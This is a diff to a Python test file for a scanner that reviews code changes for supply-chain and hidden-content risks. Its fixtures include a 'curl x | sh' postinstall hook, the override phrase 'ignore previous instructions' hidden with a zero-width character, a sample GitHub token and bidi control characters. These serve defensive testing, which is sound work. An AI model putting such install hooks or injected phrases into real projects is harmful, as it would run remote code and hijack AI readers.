@@ -122,8 +122,25 @@ class TestScanBlob:
         assert pf.scan_blob(b"a" * 100, cap=100).kind == "full"
         assert pf.scan_blob(b"a" * 101, cap=100).reason == "over-cap"
 
-    def test_binary_over_cap_stays_binary(self):
-        assert pf.scan_blob(PNG + b"\x00" * 200, cap=100).kind == "binary"
+    def test_binary_over_cap_is_unavailable(self):
+        # Spec: over the byte cap is `unavailable`, with no binary exception.
+        assert pf.scan_blob(PNG + b"\x00" * 200, cap=100).reason == "over-cap"
+
+    @pytest.mark.parametrize("extra,kind", [(0, "full"), (1, "unavailable")])
+    def test_nul_cannot_hide_over_cap_text(self, extra, kind):
+        # Regression (review finding 1): a NUL in the first 8000 bytes made an
+        # over-cap UTF-8 file "binary", which dropped the hard block.
+        head = b"/*\x00*/\n"
+        tail = "‮".encode()
+        data = head + b"x" * (100 - len(head) - len(tail) + extra) + tail
+        assert pf.scan_blob(data, cap=100).kind == kind
+
+    def test_nul_over_cap_text_hard_blocks(self):
+        data = b"/*\x00*/\n" + b"x" * pf.MAX_BLOB_BYTES + "‮".encode()
+        r = run(change("payload.js", data))
+        assert r.coverage.files[0].reason == "over-cap" and not r.coverage.complete
+        assert pf.INCOMPLETE_COVERAGE in hard(r)
+        assert not checks(r, pf.BINARY_ADDED)
 
     def test_undecodable_without_nul_is_unavailable(self):
         assert pf.scan_blob("caf\xe9 latin-1\n".encode("latin-1")).reason == "undecodable"
@@ -227,6 +244,45 @@ class TestCoverage:
         [c] = checks(r, pf.SUBMODULE)
         assert c.subject == f"{'a' * 40} -> {'b' * 40}"
 
+    # Regression (review finding 2): a gitlink on one side skipped the blob on
+    # the other side, so its text was never read or scanned.
+    @staticmethod
+    def _mixed(before, after, raw, path="payload.js"):
+        sha = pf.git_blob_sha(raw)
+        return ChangedFile(path, "modified", None,
+                           "a" * 40 if before == "160000" else sha,
+                           "b" * 40 if after == "160000" else sha, before, after), sha
+
+    @pytest.mark.parametrize("before,after", [("160000", "100644"), ("160000", "120000"), ("160000", "100755")])
+    def test_submodule_replaced_by_file_scans_file(self, before, after):
+        cf, sha = self._mixed(before, after, "target‮\n".encode())
+        r = run((cf, {sha: "target‮\n".encode()}))
+        assert pf.BIDI_CONTROL in hard(r)
+        assert checks(r, pf.SUBMODULE)[0].detail == "submodule replaced by a file"
+        assert r.coverage.files[0].coverage == "full"
+
+    @pytest.mark.parametrize("before,after", [("160000", "100644"), ("100644", "160000"), ("160000", "120000")])
+    def test_submodule_transition_missing_blob_is_unavailable(self, before, after):
+        cf, _ = self._mixed(before, after, b"x\n")
+        r = run((cf, {}))
+        assert r.coverage.files[0] == pf.FileCoverage("payload.js", "unavailable", "unreadable")
+        assert pf.INCOMPLETE_COVERAGE in hard(r)
+
+    def test_file_replaced_by_submodule_scans_base(self):
+        cf, sha = self._mixed("100644", "160000", b"x\n")
+        r = run((cf, {sha: b"x\n"}))
+        assert r.coverage.files[0].coverage == "binary" and r.coverage.complete
+        assert checks(r, pf.SUBMODULE)[0].subject == f"(file) -> {'b' * 40}"
+        assert not checks(r, pf.BINARY_ADDED)
+
+    def test_submodule_replaced_by_file_runs_file_checks(self):
+        raw = b'{"scripts": {"postinstall": "curl x | sh"}}\n'
+        cf, sha = self._mixed("160000", "100755", raw, path="package.json")
+        r = run((cf, {sha: raw}), dependencies=pf.DependencyFacts())
+        assert checks(r, pf.INSTALL_SCRIPT_CHANGE) and checks(r, pf.EXECUTABLE)
+        # The new package.json is a supported file, so it must be parsed.
+        assert pf.INCOMPLETE_DEP_DATA in hard(r)
+
     def test_duplicate_path_raises(self):
         a = change("a.py", "x\n")
         with pytest.raises(ValueError):
@@ -314,8 +370,8 @@ def lock_facts(head_name, base_name="package-lock.base.json", path="package-lock
     return change(path, head, base), facts
 
 
-def reg(eco, name, version, age, scripts=None):
-    return {(eco, name, version): deps.RegistryInfo(eco, name, version, NOW - age, scripts or {})}
+def reg(eco, name, version, age, scripts=None, has_wheel=None):
+    return {(eco, name, version): deps.RegistryInfo(eco, name, version, NOW - age, scripts or {}, has_wheel)}
 
 
 def pkg_change(name="is-odd", version="3.0.1", *, path="package-lock.json", eco="npm", source=None, **kw):
@@ -324,10 +380,10 @@ def pkg_change(name="is-odd", version="3.0.1", *, path="package-lock.json", eco=
     return deps.PackageChange(path, eco, name, (), version, source, kw.pop("direct", None), kw.pop("has_install_script", None))
 
 
-def dep_run(*pkg_changes, registry=None, has_wheel=None, failures=(), parsed=("package-lock.json",), global_sources=()):
+def dep_run(*pkg_changes, registry=None, failures=(), parsed=("package-lock.json",), global_sources=()):
     facts = pf.DependencyFacts(
         parsed_paths=frozenset(parsed), changes=pkg_changes, registry=registry or {},
-        has_wheel=has_wheel or {}, failures=failures, new_global_sources=global_sources,
+        failures=failures, new_global_sources=global_sources,
     )
     return run(dependencies=facts)
 
@@ -432,6 +488,101 @@ class TestFreshPublish:
         assert not pf.needs_registry_lookup(pkg_change(source=git))
 
 
+def npm_fetch(name, version, age, scripts=None):
+    """In-memory npm registry response for deps.lookup_npm; no network."""
+    body = json.dumps({
+        "name": name,
+        "time": {version: (NOW - age).isoformat()},
+        "versions": {version: {"scripts": scripts or {}}},
+    }).encode()
+    url = deps.npm_url(name)
+    return lambda u, max_bytes, timeout: deps.FetchResult(200, body, url)
+
+
+def manifest_facts(path, head, base=None, lookups=None):
+    """parse -> delta -> facts, the way collect builds them. `lookups` is the
+    registry map by registry key; a key with no entry is a missing lookup."""
+    old = deps.parse_file(path, base) if base is not None else None
+    delta = deps.compute_delta(old, deps.parse_file(path, head))
+    facts = pf.DependencyFacts(parsed_paths=frozenset({path}), changes=delta, registry=dict(lookups or {}))
+    return change(path, head, base), facts
+
+
+class TestExactManifestVersions:
+    # Regression (review finding 4): an exact version in a manifest skipped the
+    # registry lookup, so neither the 72-hour rule nor npm install scripts ran.
+    PKG = b'{"dependencies": {"x": "1.0.0"}}\n'
+
+    def test_missing_registry_data_blocks(self):
+        cf, facts = manifest_facts("package.json", self.PKG)
+        r = run(cf, dependencies=facts)
+        [c] = checks(r, pf.INCOMPLETE_DEP_DATA)
+        assert c.subject == "x@1.0.0"
+
+    @pytest.mark.parametrize("age,blocks", [(timedelta(hours=1), True), (timedelta(days=9), False)])
+    def test_freshness(self, age, blocks):
+        info = deps.lookup_npm("x", "1.0.0", npm_fetch("x", "1.0.0", age))
+        cf, facts = manifest_facts("package.json", self.PKG, lookups={("npm", "x", "1.0.0"): info})
+        r = run(cf, dependencies=facts)
+        assert (pf.FRESH_PUBLISH in hard(r)) is blocks
+        assert pf.INCOMPLETE_DEP_DATA not in hard(r)
+
+    def test_direct_install_scripts(self):
+        info = deps.lookup_npm("x", "1.0.0", npm_fetch("x", "1.0.0", timedelta(days=9), {"postinstall": "node i.js"}))
+        cf, facts = manifest_facts("package.json", self.PKG, lookups={("npm", "x", "1.0.0"): info})
+        r = run(cf, dependencies=facts)
+        assert "postinstall" in checks(r, pf.INSTALL_SCRIPT_DEP)[0].detail and not r.hard_blocks
+
+    def test_unchanged_exact_version_needs_no_lookup(self):
+        head = b'{"dependencies": {"x": "1.0.0"}, "name": "a"}\n'
+        cf, facts = manifest_facts("package.json", head, self.PKG)
+        assert not run(cf, dependencies=facts).hard_blocks
+
+    @pytest.mark.parametrize("spec,key", [
+        ("1.0.0", ("npm", "x", "1.0.0")),
+        ("=1.0.0", ("npm", "x", "1.0.0")),
+        ("v1.0.0", ("npm", "x", "1.0.0")),
+        (" = v1.0.0-rc.1 ", ("npm", "x", "1.0.0-rc.1")),
+        ("npm:evil@2.0.0", ("npm", "evil", "2.0.0")),
+        ("npm:@s/evil@2.0.0", ("npm", "@s/evil", "2.0.0")),
+        ("^1.0.0", None),
+        ("1.0", None),
+        ("latest", None),
+        ("npm:evil@^2.0.0", None),
+        ("npm:evil", None),
+    ])
+    def test_npm_registry_key(self, spec, key):
+        assert pf.registry_key(pkg_change("x", spec, path="package.json")) == key
+
+    @pytest.mark.parametrize("path,text,version", [
+        ("pyproject.toml", '[project]\ndependencies = ["Evil_Pkg==2.0.0"]\n', "2.0.0"),
+        ("pyproject.toml", '[tool.poetry.dependencies]\nevil-pkg = "2.0.0"\n', "2.0.0"),
+        ("pyproject.toml", '[tool.poetry.dependencies]\nevil-pkg = {version = "==2.0.0"}\n', "2.0.0"),
+        ("requirements.txt", "evil-pkg===2.0.0\n", "2.0.0"),
+        ("requirements.txt", "evil-pkg>=1,==2.0.0\n", "2.0.0"),
+        ("pyproject.toml", '[project]\ndependencies = ["evil-pkg>=2"]\n', None),
+        ("requirements.txt", "evil-pkg==2.*\n", None),
+        ("requirements.txt", "evil-pkg\n", None),
+    ])
+    def test_pypi_registry_key(self, path, text, version):
+        [c] = deps.compute_delta(None, deps.parse_file(path, text.encode()))
+        assert pf.registry_key(c) == (("pypi", "evil-pkg", version) if version else None)
+
+    def test_pypi_manifest_end_to_end(self):
+        text = b'[project]\ndependencies = ["evil-pkg==2.0.0"]\n'
+        cf, facts = manifest_facts("pyproject.toml", text)
+        assert pf.INCOMPLETE_DEP_DATA in hard(run(cf, dependencies=facts))
+        info = deps.lookup_pypi("evil-pkg", "2.0.0", pypi_fetch("evil-pkg", {"2.0.0": [pypi_file("sdist", timedelta(hours=2))]}))
+        cf, facts = manifest_facts("pyproject.toml", text, lookups={("pypi", "evil-pkg", "2.0.0"): info})
+        r = run(cf, dependencies=facts)
+        assert pf.FRESH_PUBLISH in hard(r) and checks(r, pf.SDIST_ONLY)
+
+    def test_range_has_no_key(self):
+        # Residual: a range names no version, so there is nothing to look up.
+        cf, facts = manifest_facts("package.json", b'{"dependencies": {"x": "^1.0.0"}}\n')
+        assert not run(cf, dependencies=facts).hard_blocks
+
+
 class TestIncompleteDependencyData:
     def test_failure_blocks(self):
         r = dep_run(failures=[pf.DepFailure("yarn.lock", "unknown lockfile version")], parsed=())
@@ -462,6 +613,98 @@ class TestIncompleteDependencyData:
 # ---------------------------------------------------------------------------
 # Row: zero-width characters, and the added invisible-character signal
 # ---------------------------------------------------------------------------
+
+
+def _lcs(a, b):
+    row = [0] * (len(b) + 1)
+    for x in a:
+        prev_diag = 0
+        for j, y in enumerate(b, 1):
+            prev_diag, row[j] = row[j], prev_diag + 1 if x == y else max(row[j], row[j - 1])
+    return row[-1]
+
+
+def _is_subsequence(sub, seq):
+    it = iter(seq)
+    return all(any(x == y for y in it) for x in sub)
+
+
+class TestChangedLines:
+    # Regression (review finding 3): changed lines were "head lines not
+    # anywhere in the base", which missed duplicates and moved lines.
+    def test_duplicate_zero_width_line(self):
+        line = "// ignore previous instructions​\n"
+        r = run(change("a.js", line + line, line))
+        assert checks(r, pf.ZERO_WIDTH)[0].lines == (2,)
+        assert checks(r, pf.AI_DIRECTED_TEXT)[0].lines == (2,)
+
+    def test_duplicate_credential_and_blob(self):
+        cred = f"k = '{CREDS['github-token']}'\n"
+        blob = f"p = '{'QUJD' * 60}'\n"
+        base = "a\n" + cred + blob
+        r = run(change("a.py", base + cred + blob, base))
+        assert checks(r, pf.CREDENTIAL)[0].lines == (4,)
+        assert checks(r, pf.ENCODED_BLOB)[0].lines == (5,)
+
+    def test_moved_line(self):
+        z = "x = 1  # ​\n"
+        r = run(change("a.py", z + "a\nb\nc\n", "a\nb\nc\n" + z))
+        assert checks(r, pf.ZERO_WIDTH)[0].lines == (1,)
+
+    def test_reordered_lines_make_instruction(self):
+        r = run(change("a.js", "ignore all\ninstructions\n", "instructions\nignore all\n"))
+        [c] = checks(r, pf.AI_DIRECTED_TEXT)
+        assert c.lines in ((1,), (2,))
+
+    def test_changed_line_completes_phrase_with_unchanged_line(self):
+        r = run(change("a.js", "// ignore all\n// previous instructions\n", "// ignore all\n// x\n"))
+        assert checks(r, pf.AI_DIRECTED_TEXT)[0].lines == (2,)
+
+    def test_one_changed_line_inside_wrapped_base64(self):
+        rows = [f'  "{"QUJD" * 19}",\n' for _ in range(4)]
+        head = rows[:2] + [f'  "{"WFla" * 19}",\n'] + rows[3:]
+        r = run(change("a.js", "".join(head), "".join(rows)))
+        [c] = [c for c in checks(r, pf.ENCODED_BLOB) if "wrapped" in c.detail]
+        assert c.lines == (3,)
+
+    def test_line_numbers_after_insert(self):
+        base = "l1\nDUP\nl3\n"
+        r = run(change("a.txt", base + "DUP" + "x" * 600 + "\n" + "DUP\n", base))
+        assert checks(r, pf.LONG_LINE)[0].lines == (4,)
+
+    @pytest.mark.parametrize("seed", range(40))
+    def test_matches_a_shortest_edit_script(self, seed):
+        import random
+
+        rnd = random.Random(seed)
+        a = [rnd.choice("abcd") for _ in range(rnd.randrange(0, 25))]
+        b = [rnd.choice("abcd") for _ in range(rnd.randrange(0, 25))]
+        head, base = pf._Lines("".join(x + "\n" for x in b)), pf._Lines("".join(x + "\n" for x in a))
+        added = pf._added_lines(head, base)
+        a, b = base.lines, head.lines  # an empty text is one empty line
+        kept = [b[i] for i in range(len(b)) if i + 1 not in set(added)]
+        assert len(added) == len(b) - _lcs(a, b)
+        assert _is_subsequence(kept, a)
+
+    def test_over_budget_counts_whole_middle(self):
+        base = pf._Lines("top\n" + "".join(f"a{i}\n" for i in range(50)) + "end\n")
+        head = pf._Lines("top\n" + "".join(f"b{i}\n" for i in range(50)) + "end\n")
+        assert pf._added_lines(head, base, budget=10) == list(range(2, 52))
+
+    def test_large_rewrite_is_bounded(self):
+        base = "".join(f"a{i}\n" for i in range(200_000))
+        head = "".join(f"b{i}\n" for i in range(200_000))
+        start = time.monotonic()
+        r = run(change("a.txt", head, base))
+        assert time.monotonic() - start < 10
+        assert r.coverage.complete
+
+    def test_large_file_small_change(self):
+        base = "".join(f"line {i}\n" for i in range(300_000))
+        lines = base.splitlines(keepends=True)
+        lines[150_000] = "x​\n"
+        r = run(change("a.txt", "".join(lines), base))
+        assert checks(r, pf.ZERO_WIDTH)[0].lines == (150_001,)
 
 
 class TestZeroWidth:
@@ -657,18 +900,41 @@ class TestPackageJsonScripts:
         assert checks(run(change("package.json", head, head.replace("curl x | sh", "echo"))), pf.INSTALL_SCRIPT_CHANGE)
 
 
+def pypi_fetch(name, files_by_version):
+    """In-memory PyPI JSON response for deps.lookup_pypi; no network."""
+    body = json.dumps({"info": {"name": name}, "releases": files_by_version}).encode()
+    url = deps.pypi_url(name)
+    return lambda u, max_bytes, timeout: deps.FetchResult(200, body, url)
+
+
+def pypi_file(kind, age=timedelta(days=9)):
+    return {"packagetype": kind, "upload_time_iso_8601": (NOW - age).isoformat()}
+
+
 class TestSdistOnly:
     def test_no_wheel(self):
         c = pkg_change("evil", "1.0", path="uv.lock", eco="pypi")
-        r = dep_run(c, registry=reg("pypi", "evil", "1.0", timedelta(days=9)),
-                    has_wheel={("evil", "1.0"): False}, parsed=("uv.lock",))
+        r = dep_run(c, registry=reg("pypi", "evil", "1.0", timedelta(days=9), has_wheel=False), parsed=("uv.lock",))
         assert checks(r, pf.SDIST_ONLY)[0].level == pf.SIGNAL
 
-    @pytest.mark.parametrize("has_wheel", [{("ok", "1.0"): True}, {}])
+    @pytest.mark.parametrize("has_wheel", [True, None])
     def test_wheel_or_unknown(self, has_wheel):
         c = pkg_change("ok", "1.0", path="uv.lock", eco="pypi")
-        r = dep_run(c, registry=reg("pypi", "ok", "1.0", timedelta(days=9)), has_wheel=has_wheel, parsed=("uv.lock",))
+        r = dep_run(c, registry=reg("pypi", "ok", "1.0", timedelta(days=9), has_wheel=has_wheel), parsed=("uv.lock",))
         assert not checks(r, pf.SDIST_ONLY)
+
+    @pytest.mark.parametrize("files,flag", [
+        ([pypi_file("sdist")], True),
+        ([pypi_file("sdist"), pypi_file("bdist_wheel")], False),
+    ])
+    def test_real_lookup_pypi_output(self, files, flag):
+        # Regression (review finding 5): has_wheel comes from deps.lookup_pypi's
+        # RegistryInfo, not a separate mapping collect had to fill.
+        c = pkg_change("evil", "1.0", path="requirements.txt", eco="pypi")
+        info = deps.lookup_pypi("evil", "1.0", pypi_fetch("evil", {"1.0": files}))
+        r = dep_run(c, registry={("pypi", "evil", "1.0"): info}, parsed=("requirements.txt",))
+        assert bool(checks(r, pf.SDIST_ONLY)) is flag
+        assert not r.hard_blocks
 
 
 # ---------------------------------------------------------------------------
